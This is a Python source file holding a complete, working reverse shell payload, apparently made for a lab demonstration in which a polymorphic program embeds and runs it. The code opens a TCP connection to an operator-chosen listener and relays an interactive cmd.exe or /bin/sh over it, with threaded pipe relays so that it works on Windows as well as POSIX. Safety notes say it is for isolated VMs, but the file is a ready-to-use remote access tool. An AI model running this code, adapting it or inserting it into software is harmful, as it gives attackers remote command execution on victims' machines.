#!/usr/bin/env python3
"""Lab-only reverse shell payload for the Hidden-Bytes demonstration.

This is the payload embedded in the polymorphic program. It connects back to
a listener that the operator controls, then hands the connection to a local
shell.

Safety rules for this file:

- The address and port are given on the command line and default to
  127.0.0.1, so it can only reach a listener on the same machine unless the
  operator points it somewhere else on purpose.
- It is meant for an isolated lab VM with a host-only network. Never point
  it at a machine you do not own or have written permission to test.
- There is no persistence, no privilege escalation, no lateral movement and
  no evasion. It opens one TCP connection and relays a shell over it.

The polymorphic generator embeds this file and executes it, forwarding the
generated program's own arguments:

    ./polymorphic.exe --host 192.168.56.101 --port 4444

Portability
-----------
The shell is wired to the socket by **relaying bytes through pipes with two
threads**, not with ``os.dup2(sock, 0/1/2)``. The ``dup2`` trick is POSIX-only:
on Windows a socket handle is not a low file descriptor, so ``dup2`` fails with
``OSError: [Errno 9] Bad file descriptor``. The pipe relay works the same way on
Windows (``cmd.exe``) and Linux/macOS (``/bin/sh``).
"""

import argparse
import os
import socket
import subprocess
import sys
import threading


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="reverse_shell_payload",
        description="Connect back to a lab listener and relay a shell.",
    )
    parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="address of the lab listener (default: 127.0.0.1)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=4444,
        help="port of the lab listener (default: 4444)",
    )
    return parser


def _socket_to_shell(connection: socket.socket, stdin_fd: int) -> None:
    """Forward bytes the listener sends into the shell's standard input."""
    try:
        while True:
            data = connection.recv(4096)
            if not data:
                break
            os.write(stdin_fd, data)
    except OSError:
        pass
    finally:
        try:
            os.close(stdin_fd)
        except OSError:
            pass


def _shell_to_socket(stdout_fd: int, connection: socket.socket) -> None:
    """Forward the shell's output (and errors) back to the listener."""
    try:
        while True:
            data = os.read(stdout_fd, 4096)
            if not data:
                break
            connection.sendall(data)
    except OSError:
        pass


def main() -> int:
    args = build_parser().parse_args()

    # An interactive shell per platform. cmd.exe on Windows; /bin/sh on POSIX.
    shell = ["cmd.exe"] if os.name == "nt" else ["/bin/sh", "-i"]

    print(
        f"[INFO] Reverse shell initialized. Connecting to {args.host}:{args.port}..."
    )

    try:
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.connect((args.host, args.port))
    except OSError as exc:
        print(
            f"[ERROR] Could not connect to {args.host}:{args.port}: {exc}",
            file=sys.stderr,
        )
        return 1

    print("[INFO] Connected. Starting shell.")

    # Give the shell its own pipes, then relay those pipes to/from the socket.
    # bufsize=0 keeps the pipes unbuffered so output reaches the listener
    # immediately instead of waiting for a full buffer.
    try:
        process = subprocess.Popen(  # noqa: S602 - lab payload, fixed shell
            shell,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=0,
        )
    except OSError as exc:
        print(f"[ERROR] Could not start the shell: {exc}", file=sys.stderr)
        connection.close()
        return 1

    reader = threading.Thread(
        target=_socket_to_shell,
        args=(connection, process.stdin.fileno()),
        daemon=True,
    )
    writer = threading.Thread(
        target=_shell_to_socket,
        args=(process.stdout.fileno(), connection),
        daemon=True,
    )
    reader.start()
    writer.start()

    # Wait for the shell to exit (for example the operator types ``exit``),
    # then tear the connection down so the relay threads unblock.
    returncode = process.wait()
    writer.join(timeout=5)
    try:
        connection.shutdown(socket.SHUT_RDWR)
    except OSError:
        pass
    connection.close()

    return returncode


if __name__ == "__main__":
    raise SystemExit(main())
